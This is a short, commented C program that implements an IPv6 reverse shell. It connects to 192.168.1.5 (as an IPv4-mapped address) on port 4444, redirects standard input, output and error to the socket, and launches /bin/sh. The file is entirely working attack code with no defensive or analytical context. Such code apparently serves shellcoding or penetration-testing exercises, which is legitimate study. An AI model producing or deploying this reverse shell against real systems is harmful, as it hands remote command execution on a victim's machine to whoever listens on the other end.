#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  

//For dup2();
int i;

// sockfd for host 
int sockfd;    

//Length of socket for new connections                 
socklen_t sock_len; 

// sockaddr_in6 struct    
struct sockaddr_in6 srvaddr;

int main()  
{  
	
	//Create a socket  
    sockfd = socket(AF_INET6, SOCK_STREAM, 0);
    
    //Initialize sockaddr struct for reverse socket
    srvaddr.sin6_family = AF_INET6;  
    srvaddr.sin6_port = htons(4444);  
    inet_pton(AF_INET6, "::ffff:192.168.1.5", &srvaddr.sin6_addr);
    
    //Connect to socket
	connect(sockfd, (struct sockaddr *)&srvaddr, sizeof(srvaddr));
  
	//Duplicate file descriptors for STDIN, STDOUT and STDERR
	for(i = 0; i <= 2; i++)
		dup2(sockfd, i);
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
      
}
